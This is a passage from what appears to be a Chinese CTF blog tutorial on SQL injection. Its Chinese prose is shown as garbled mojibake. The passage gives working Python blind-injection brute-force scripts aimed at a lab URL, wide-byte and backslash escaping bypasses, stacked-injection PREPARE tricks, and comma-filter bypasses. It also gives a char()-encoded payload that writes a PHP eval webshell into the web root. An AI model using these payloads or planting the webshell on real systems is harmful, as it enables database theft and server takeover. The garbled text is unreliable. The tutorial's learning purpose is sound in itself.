é€šé…ç¬¦å…è®¸åŒ¹é…ä»»ä½•å•ä¸ªå­—ç¬¦ã€‚åŒ¹é…æˆåŠŸåˆ™è¿”å›1ï¼Œåä¹‹è¿”å›0ï¼Œå¯ç”¨äºsqlç›²æ³¨ã€‚</p><ol><li><p>åˆ¤æ–­æ•°æ®åº“é•¿åº¦<br>å¯ç”¨length()å‡½æ•°ï¼Œä¹Ÿå¯ç”¨_ï¼Œå¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or database() like &#x27;</span>________<span class="string">&#x27;--+  // å›æ˜¾æ­£å¸¸</span></span><br></pre></td></tr></table></figure></li><li><p>åˆ¤æ–­æ•°æ®åº“å</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or database() like &#x27;</span>s%<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string">/?id=&#x27;</span> or (select database()) like <span class="string">&#x27;s%&#x27;</span> --+</span><br><span class="line">æˆ–è€…:</span><br><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or database() like &#x27;</span>s_______<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string">/?id=&#x27;</span> or (select database()) like <span class="string">&#x27;s_______&#x27;</span> --+</span><br></pre></td></tr></table></figure><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå›æ˜¾æ­£å¸¸ï¼Œè¯´æ˜æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯sã€‚</p></li></ol><p>ç»¼ä¸Šæ‰€è¿°ï¼Œå¾ˆæ˜æ˜¾å’Œæ™®é€šçš„å¸ƒå°”ç›²æ³¨å·®ä¸å¤šï¼Œäºæ˜¯å†™ä¸ªGETçš„äºŒåˆ†æ³•ç›²æ³¨è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># strs = string.printable</span></span><br><span class="line">strs = string.ascii_letters + string.digits + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&#x27; or (select database()) like &#x27;&#123;&#125;%&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">        char = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">            payloads = payload.<span class="built_in">format</span>(name + j)</span><br><span class="line">            urls = url + payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                name += j</span><br><span class="line">                <span class="built_in">print</span>(j, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                char = j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="REGEXP-æ³¨å…¥"><a href="#REGEXP-æ³¨å…¥" class="headerlink" title="REGEXP æ³¨å…¥"></a>REGEXP æ³¨å…¥</h3><p>REGEXPæ³¨å…¥ï¼Œå³regexpæ­£åˆ™è¡¨è¾¾å¼æ³¨å…¥ã€‚REGEXPæ³¨å…¥ï¼Œåˆå«ç›²æ³¨å€¼æ­£åˆ™è¡¨è¾¾å¼æ”»å‡»ã€‚åº”ç”¨åœºæ™¯å°±æ˜¯ç›²æ³¨ï¼ŒåŸç†æ˜¯ç›´æ¥æŸ¥è¯¢è‡ªå·±éœ€è¦çš„æ•°æ®ï¼Œç„¶åé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ã€‚</p><ol><li><p>åˆ¤æ–­æ•°æ®åº“é•¿åº¦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or (length(database())) regexp 8 --+  // å›æ˜¾æ­£å¸¸</span></span><br></pre></td></tr></table></figure></li><li><p>åˆ¤æ–­æ•°æ®åº“å</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or database() regexp &#x27;</span>^s<span class="string">&#x27;--+    // å›æ˜¾æ­£å¸¸</span></span><br><span class="line"><span class="string">/?id=&#x27;</span> or database() regexp <span class="string">&#x27;se&#x27;</span>--+    // å›æ˜¾æ­£å¸¸, ä¸é€‚ç”¨^å’Œ$è¿›è¡ŒåŒ¹é…ä¹Ÿå¯ä»¥</span><br><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or database() regexp &#x27;</span>^sa<span class="string">&#x27;--+   // æŠ¥é”™</span></span><br><span class="line"><span class="string">/?id=&#x27;</span> or database() regexp <span class="string">&#x27;y$&#x27;</span>--+    // å›æ˜¾æ­£å¸¸</span><br></pre></td></tr></table></figure></li></ol><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># strs = string.printable</span></span><br><span class="line">strs = string.ascii_letters + string.digits + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&#x27; or (select database()) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">        char = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">            payloads = payload.<span class="built_in">format</span>(name + j)</span><br><span class="line">            urls = url + payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                name += j</span><br><span class="line">                <span class="built_in">print</span>(j, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                char = j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šè„šæœ¬éƒ½è¦æ³¨æ„æ˜¯æŒæ¡ç¼–å†™æ€è·¯ï¼Œä¸æ˜¯å¹²æŠ„è„šæœ¬ã€‚</p><h3 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h3><p>å‰ç½®çŸ¥è¯†</p><p><strong>magic_quotes_gpc ï¼ˆé­”æœ¯å¼•å·å¼€å…³</strong><br>magic_quotes_gpcå‡½æ•°åœ¨phpä¸­çš„ä½œç”¨æ˜¯åˆ¤æ–­è§£æç”¨æˆ·æäº¤çš„æ•°æ®ï¼Œå¦‚åŒ…æ‹¬æœ‰ï¼špostã€getã€cookieè¿‡æ¥çš„æ•°æ®å¢åŠ è½¬ä¹‰å­—ç¬¦â€œ\â€ï¼Œä»¥ç¡®ä¿è¿™äº›æ•°æ®ä¸ä¼šå¼•èµ·ç¨‹åºï¼Œç‰¹åˆ«æ˜¯æ•°æ®åº“è¯­å¥å› ä¸ºç‰¹æ®Šå­—ç¬¦å¼•èµ·çš„æ±¡æŸ“è€Œå‡ºç°è‡´å‘½çš„é”™è¯¯ã€‚</p><p>å•å¼•å·ï¼ˆâ€™ï¼‰ã€åŒå¼•å·ï¼ˆâ€ï¼‰ã€åæ–œçº¿ï¼ˆ\ï¼‰ç­‰å­—ç¬¦éƒ½ä¼šè¢«åŠ ä¸Šåæ–œçº¿ï¼Œæˆ‘ä»¬è¾“å…¥çš„ä¸œè¥¿å¦‚æœä¸èƒ½é—­åˆï¼Œé‚£æˆ‘ä»¬çš„è¾“å…¥å°±ä¸ä¼šå½“ä½œä»£ç æ‰§è¡Œï¼Œå°±æ— æ³•äº§ç”ŸSQLæ³¨å…¥ã€‚</p><p><strong>addslashes()å‡½æ•°</strong></p><p>è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²</p><p>é¢„å®šä¹‰å­—ç¬¦ï¼šå•å¼•å·ï¼ˆâ€™ï¼‰ï¼ŒåŒå¼•å·ï¼ˆâ€ï¼‰ï¼Œåæ–œæ ï¼ˆ\ï¼‰ï¼ŒNULL</p><p>å®½å­—èŠ‚æ¦‚å¿µï¼š</p><ol><li>å•å­—èŠ‚å­—ç¬¦é›†ï¼šæ‰€æœ‰çš„å­—ç¬¦éƒ½ä½¿ç”¨ä¸€ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºï¼Œæ¯”å¦‚ ASCII ç¼–ç (0-127)</li><li>å¤šå­—èŠ‚å­—ç¬¦é›†ï¼šåœ¨å¤šå­—èŠ‚å­—ç¬¦é›†ä¸­ï¼Œä¸€éƒ¨åˆ†å­—èŠ‚ç”¨å¤šä¸ªå­—èŠ‚æ¥è¡¨ç¤ºï¼Œå¦ä¸€éƒ¨åˆ†ï¼ˆå¯èƒ½æ²¡æœ‰ï¼‰ç”¨å•ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºã€‚</li><li>UTF-8 ç¼–ç ï¼š æ˜¯ä¸€ç§ç¼–ç çš„ç¼–ç æ–¹å¼ï¼ˆå¤šå­—èŠ‚ç¼–ç ï¼‰ï¼Œå®ƒå¯ä»¥ä½¿ç”¨1~4ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªç¬¦å·ï¼Œæ ¹æ®ä¸åŒçš„ç¬¦å·è€Œå˜åŒ–å­—èŠ‚é•¿åº¦ã€‚</li><li>å¸¸è§çš„å®½å­—èŠ‚ï¼š GB2312ã€GBKã€GB18030ã€BIG5ã€Shift_JIS GB2312 ä¸å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ï¼Œå¯ä»¥æ”¶é›†å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥çš„ç¼–ç ã€‚</li><li>å®½å­—èŠ‚æ³¨å…¥æ—¶åˆ©ç”¨mysqlçš„ä¸€ä¸ªç‰¹æ€§ï¼Œä½¿ç”¨GBKç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ±‰å­—</li></ol><p>å®½å­—èŠ‚SQLæ³¨å…¥ä¸»è¦æ˜¯æºäºç¨‹åºå‘˜è®¾ç½®æ•°æ®åº“ç¼–ç ä¸ºéè‹±æ–‡ç¼–ç é‚£ä¹ˆå°±æœ‰å¯èƒ½äº§ç”Ÿå®½å­—èŠ‚æ³¨å…¥ã€‚</p><p>ä¾‹å¦‚è¯´MySqlçš„ç¼–ç è®¾ç½®ä¸ºäº†SET NAMES â€˜gbkâ€™æˆ–æ˜¯ SET character_set_client &#x3D;gbkï¼Œè¿™æ ·é…ç½®ä¼šå¼•å‘ç¼–ç è½¬æ¢ä»è€Œå¯¼è‡´çš„æ³¨å…¥æ¼æ´ã€‚</p><p>å®½å­—èŠ‚SQLæ³¨å…¥çš„æ ¹æœ¬åŸå› :</p><p>å®½å­—èŠ‚SQLæ³¨å…¥å°±æ˜¯PHPå‘é€è¯·æ±‚åˆ°MySqlæ—¶ä½¿ç”¨äº†è¯­å¥</p><p>SET NAMES â€˜gbkâ€™ æˆ–æ˜¯SET character_set_client &#x3D;gbk è¿›è¡Œäº†ä¸€æ¬¡ç¼–ç ï¼Œä½†æ˜¯åˆç”±äºä¸€äº›ä¸ç»æ„çš„å­—ç¬¦é›†è½¬æ¢å¯¼è‡´äº†å®½å­—èŠ‚æ³¨å…¥ã€‚</p><p>magic_quotes_gpcçš„ä½œç”¨ï¼šå½“PHPçš„ä¼ å‚ä¸­æœ‰ç‰¹æ®Šå­—ç¬¦å°±ä¼šåœ¨å‰é¢åŠ è½¬ä¹‰å­—ç¬¦â€™&#39;,æ¥åšä¸€å®šçš„è¿‡æ»¤</p><p>ä¸ºäº†ç»•è¿‡magic_quotes_gpcçš„,äºæ˜¯ä¹æˆ‘ä»¬å¼€å§‹å¯¼å…¥å®½å­—èŠ‚çš„æ¦‚å¿µ</p><p>æˆ‘ä»¬å‘ç°\çš„ç¼–ç æ˜¯%5cï¼Œç„¶åæˆ‘ä»¬ä¼šæƒ³åˆ°ä¼ å‚ä¸€ä¸ªå­—ç¬¦æƒ³åŠæ³•å‡‘æˆä¸€ä¸ªgbkå­—ç¬¦,ä¾‹å¦‚ï¼šâ€˜é‹â€™å­—æ˜¯%df%5c</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM <span class="built_in">users</span> WHERE <span class="built_in">id</span>=<span class="string">&#x27;1\&#x27;</span><span class="string">&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure><p>è¿™æ¡è¯­å¥å› ä¸º\ä½¿æˆ‘ä»¬æ— æ³•å»æ³¨å…¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥ç”¨%dfåƒåˆ°%5c,å› ä¸ºå¦‚æœç”¨GBKç¼–ç çš„è¯è¿™ä¸ªå°±æ˜¯é‹ï¼Œç„¶åæˆåŠŸç»•è¿‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM <span class="built_in">users</span> WHERE <span class="built_in">id</span>=<span class="string">&#x27;1ï¿½\&#x27;</span><span class="comment">#&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure><p>è™½ç„¶æ˜¯å†™åœ¨äº†è¿‡æ»¤å¼•å·çš„ä½ç½®ä½†æ˜¯å…¶å®ä¸æ­¢é€‚ç”¨äºè¿‡æ»¤å¼•å·<br>ä½¿ç”¨åæ–œæ  \ é€ƒé€¸ Sql è¯­å¥<br>å¦‚æœæ²¡æœ‰è¿‡æ»¤åæ–œæ çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åæ–œæ å°†åé¢çš„å¼•å·è½¬ä¹‰ï¼Œä»è€Œé€ƒé€¸åé¢çš„ Sql è¯­å¥ã€‚</p><p>å‡è®¾sqlè¯­å¥ä¸ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username, password from <span class="built_in">users</span> <span class="built_in">where</span> username=<span class="string">&#x27;$username&#x27;</span> and password=<span class="string">&#x27;$password&#x27;</span>;</span><br></pre></td></tr></table></figure><p>å‡è®¾è¾“å…¥çš„ç”¨æˆ·åæ˜¯ admin\ï¼Œå¯†ç è¾“å…¥çš„æ˜¯ or 1# æ•´ä¸ªSQLè¯­å¥å˜æˆäº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from <span class="built_in">users</span> <span class="built_in">where</span> username=<span class="string">&#x27;admin\&#x27;</span> and password=<span class="string">&#x27; or 1#&#x27;</span></span><br></pre></td></tr></table></figure><p>ç”±äºå•å¼•å·è¢«è½¬ä¹‰ï¼Œand password&#x3D;è¿™éƒ¨åˆ†éƒ½æˆäº†usernameçš„ä¸€éƒ¨åˆ†ï¼Œå³</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="string">&#x27;admin\&#x27;</span> and password=<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿™æ · or 1 å°±é€ƒé€¸å‡ºæ¥äº†ï¼Œç”±æ­¤å¯æ§ï¼Œå¯ä½œä¸ºæ³¨å…¥ç‚¹äº†ã€‚</p><h3 id="å †å æ³¨å…¥æ—¶åˆ©ç”¨-MySql-é¢„å¤„ç†"><a href="#å †å æ³¨å…¥æ—¶åˆ©ç”¨-MySql-é¢„å¤„ç†" class="headerlink" title="å †å æ³¨å…¥æ—¶åˆ©ç”¨ MySql é¢„å¤„ç†"></a>å †å æ³¨å…¥æ—¶åˆ©ç”¨ MySql é¢„å¤„ç†</h3><p>åœ¨é‡åˆ°å †å æ³¨å…¥æ—¶ï¼Œå¦‚æœselectã€renameã€alterå’Œhandlerç­‰è¯­å¥éƒ½è¢«è¿‡æ»¤çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨MySqlé¢„å¤„ç†è¯­å¥é…åˆconcatæ‹¼æ¥æ¥æ‰§è¡Œsqlè¯­å¥æ‹¿flagã€‚</p><ol><li>PREPAREï¼šå‡†å¤‡ä¸€æ¡SQLè¯­å¥ï¼Œå¹¶åˆ†é…ç»™è¿™æ¡SQLè¯­å¥ä¸€ä¸ªåå­—(hello)ä¾›ä¹‹åè°ƒç”¨</li><li>EXECUTEï¼šæ‰§è¡Œå‘½ä»¤</li><li>DEALLOCATE PREPAREï¼šé‡Šæ”¾å‘½ä»¤</li><li>SETï¼šç”¨äºè®¾ç½®å˜é‡(@a)</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;sEt @a=concat(&quot;sel&quot;,&quot;ect flag from flag_here&quot;);PRepare hello from @a;execute hello;#</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜ç”¨å¤§å°å†™ç®€å•ç»•äº†ä¸€ä¸‹å…¶ä»–è¿‡æ»¤</p><p><strong>MySql é¢„å¤„ç†é…åˆåå…­è¿›åˆ¶ç»•è¿‡å…³é”®å­—</strong><br>åŸºæœ¬åŸç†å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select hex(<span class="string">&#x27;show databases&#x27;</span>);</span><br><span class="line">+------------------------------+</span><br><span class="line">| hex(<span class="string">&#x27;show databases;&#x27;</span>)       |</span><br><span class="line">+------------------------------+</span><br><span class="line">| 73686F7720646174616261736573 |</span><br><span class="line">+------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="built_in">set</span> @b=0x73686F7720646174616261736573;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; prepare <span class="built_in">test</span> from @b;</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">mysql&gt; execute <span class="built_in">test</span>;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| challenges         |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| security           |</span><br><span class="line">| <span class="built_in">test</span>               |</span><br><span class="line">+--------------------+</span><br><span class="line">6 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.02 sec)</span><br></pre></td></tr></table></figure><p>å³payloadç±»ä¼¼å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;sEt @a=0x73686F7720646174616261736573;PRepare hello from @a;execute hello;#</span></span><br></pre></td></tr></table></figure><p><strong>MySqlé¢„å¤„ç†é…åˆå­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡å…³é”®å­—</strong><br>åŸç†å°±æ˜¯å€ŸåŠ©char()å‡½æ•°å°†asciiç è½¬åŒ–ä¸ºå­—ç¬¦ç„¶åå†ä½¿ç”¨concat()å‡½æ•°å°†å­—ç¬¦è¿æ¥èµ·æ¥ï¼Œæœ‰äº†å‰é¢çš„åŸºç¡€è¿™é‡Œåº”è¯¥å¾ˆå¥½ç†è§£äº†ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> @sql=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(39),char(60),char(63),char(112),char(104),char(112),char(32),char(101),char(118),char(97),char(108),char(40),char(36),char(95),char(80),char(79),char(83),char(84),char(91),char(119),char(104),char(111),char(97),char(109),char(105),char(93),char(41),char(59),char(63),char(62),char(39),char(32),char(105),char(110),char(116),char(111),char(32),char(111),char(117),char(116),char(102),char(105),char(108),char(101),char(32),char(39),char(47),char(118),char(97),char(114),char(47),char(119),char(119),char(119),char(47),char(104),char(116),char(109),char(108),char(47),char(102),char(97),char(118),char(105),char(99),char(111),char(110),char(47),char(115),char(104),char(101),char(108),char(108),char(46),char(112),char(104),char(112),char(39),char(59));prepare s1 from @sql;execute s1;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ä¸ç”¨concatå‡½æ•°ï¼Œç›´æ¥ç”¨charå‡½æ•°ä¹Ÿå…·æœ‰è¿æ¥åŠŸèƒ½ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,119,104,111,97,109,105,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare s1 from @sql;execute s1;</span><br></pre></td></tr></table></figure><h3 id="è¿‡æ»¤é€—å·ç»•è¿‡"><a href="#è¿‡æ»¤é€—å·ç»•è¿‡" class="headerlink" title="è¿‡æ»¤é€—å·ç»•è¿‡"></a>è¿‡æ»¤é€—å·ç»•è¿‡</h3><p>å½“é€—å·è¢«è¿‡æ»¤äº†ä¹‹åï¼Œæˆ‘ä»¬ä¾¿ä¸èƒ½å‘ä¸‹é¢è¿™æ ·æ­£å¸¸çš„æ—¶å€™substr()å‡½æ•°å’Œlimitè¯­å¥äº†ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr((select database()),1,1);</span><br><span class="line">select * from <span class="built_in">users</span> <span class="built_in">limit</span> 0,1;</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨fromâ€¦forâ€¦ç»•è¿‡</strong><br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ fromâ€¦for.. è¯­å¥æ›¿æ¢ substr() å‡½æ•°é‡Œçš„ ,1,1ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">select substr((select database()) from 1 <span class="keyword">for</span> 1);</span><br><span class="line"><span class="comment"># æ­¤æ—¶ from 1 for 1 ä¸­çš„ä¸¤ä¸ª1åˆ†åˆ«ä»£æ›¿ substr() å‡½æ•°é‡Œçš„ä¸¤ä¸ª1</span></span><br><span class="line"></span><br><span class="line">select substr((select database()) from 1 <span class="keyword">for</span> 1);    <span class="comment"># s</span></span><br><span class="line">select substr((select database()) from 2 <span class="keyword">for</span> 1);    <span class="comment"># e</span></span><br><span class="line">select substr((select database()) from 3 <span class="keyword">for</span> 1);    <span class="comment"># c</span></span><br><span class="line">select substr((select database()) from 4 <span class="keyword">for</span> 1);    <span class="comment"># u</span></span><br><span class="line">select substr((select database()) from 5 <span class="keyword">for</span> 1);    <span class="comment"># r</span></span><br><span class="line">select substr((select database()) from 6 <span class="keyword">for</span> 1);    <span class="comment"># i</span></span><br><span class="line">select substr((select database()) from 7 <span class="keyword">for</span> 1);    <span class="comment"># t</span></span><br><span class="line">select substr((select database()) from 8 <span class="keyword">for</span> 1);    <span class="comment"># y</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¦‚æœè¿‡æ»¤äº†ç©ºæ ¼, åˆ™å¯ä»¥ä½¿ç”¨æ‹¬å·æ¥ä»£æ›¿ç©ºæ ¼:</span></span><br><span class="line">select substr((select database())from(1)<span class="keyword">for</span>(1));    <span class="comment"># s</span></span><br><span class="line">select substr((select database())from(2)<span class="keyword">for</span>(1));    <span class="comment"># e</span></span><br><span class="line">select substr((select database())from(3)<span class="keyword">for</span>(1));    <span class="comment"># c</span></span><br><span class="line">select substr((select database())from(4)<span class="keyword">for</span>(1));    <span class="comment"># u</span></span><br><span class="line">select substr((select database())from(5)<span class="keyword">for</span>(1));    <span class="comment"># r</span></span><br><span class="line">select substr((select database())from(6)<span class="keyword">for</span>(1));    <span class="comment"># i</span></span><br><span class="line">select substr((select database())from(7)<span class="keyword">for</span>(1));    <span class="comment"># t</span></span><br><span class="line">select substr((select database())from(8)<span class="keyword">for</span>(1));    <span class="comment"># y</span></span><br></pre></td></tr></table></figure><p>å³ï¼Œfromç”¨æ¥æŒ‡å®šä»ä½•å¤„å¼€å§‹æˆªå–ï¼Œforç”¨æ¥æŒ‡å®šæˆªå–çš„é•¿åº¦ï¼Œå¦‚æœä¸åŠ forçš„è¯åˆ™ from 1 å°±ç›¸å½“äºä»å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä½ä¸€ç›´æˆªå–åˆ°æœ€åï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">select substr((select database()) from 1);    <span class="comment"># security</span></span><br><span class="line">select substr((select database()) from 2);    <span class="comment"># ecurity</span></span><br><span class="line">select substr((select database()) from 3);    <span class="comment"># curity</span></span><br><span class="line">select substr((select database()) from 4);    <span class="comment"># urity</span></span><br><span class="line">select substr((select database()) from 5);    <span 